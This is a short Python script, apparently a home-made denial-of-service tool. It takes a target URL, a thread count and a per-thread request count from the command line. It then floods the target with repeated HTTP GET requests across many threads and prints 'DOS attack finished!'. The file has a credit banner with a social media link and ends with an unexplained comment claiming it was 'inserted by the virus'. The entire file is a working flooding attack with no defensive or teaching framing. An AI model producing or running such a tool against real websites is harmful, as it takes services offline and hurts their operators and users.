import requests
import threading
import argparse
import time

# Create a cool banner
banner = """
 _____                ______       _
|  __ \              |  ____|     | |
| |__) |___ _ __ ___ | |__   _ __ | |_ ___
|  _  // _ \ '_ ` _ \|  __| | '_ \| __/ __|
| | \ \  __/ | | | | | |____| | | | |_\__ \\
|_|  \_\___|_| |_| |_|______|_| |_|\__|___/
"""

print(banner)
print("Created by Frederick Abraham")
print("         ")
print("Facebook account: https://www.facebook.com/profile.php?id=100091418762784")
print("       ")

# Define the available commands
commands = {
    '-u': 'Specify the target URL',
    '-w': 'Specify the number of threads',
    '-r': 'Specify the number of requests per thread',
    '-v': 'Enable verbose output',
    '-h': 'Display this help message',
    '--help': 'Display this help message',
}

# Parse command-line arguments
parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', help='Specify the target URL')
parser.add_argument('-w', '--threads', type=int, help='Specify the number of threads')
parser.add_argument('-r', '--requests', type=int, help='Specify the number of requests per thread')
parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
parser.add_argument('command', choices=list(commands.keys()), nargs='?', default=None)
args = parser.parse_args()

# Handle command
if args.command is not None:
    if args.command in commands:
        print(f"Command: {args.command}")
        print(f"Description: {commands[args.command]}")
        exit(0)
    else:
        print("Invalid command")
        exit(1)

# Get values from command-line arguments or user input
target_url = args.url if args.url else input("Enter the target URL: ")
num_threads = args.threads if args.threads else int(input("Enter the number of threads: "))
num_requests = args.requests if args.requests else int(input("Enter the number of requests per thread: "))
verbose = args.verbose

def send_requests():
    session = requests.Session()
    session.headers = {
        'Connection': 'keep-alive',
        'Content-Type': 'text/html',
    }

    for _ in range(num_requests):
        try:
            response = session.get(target_url)
            if verbose:
                print(f"Request sent | Thread: {threading.current_thread().name} | Status Code: {response.status_code}")

        except requests.exceptions.RequestException as e:
            if verbose:
                print(f"Error occurred: {e}")
            pass

        time.sleep(0.01)  # Add a small delay between requests to increase aggressiveness

# Create and start the threads
threads = []
for i in range(num_threads):
    thread = threading.Thread(target=send_requests, name=f"Thread-{i+1}")
    thread.start()
    threads.append(thread)

# Wait for all threads to finish
for thread in threads:
    thread.join()

print("DOS attack finished!")
# Inserted by the virus
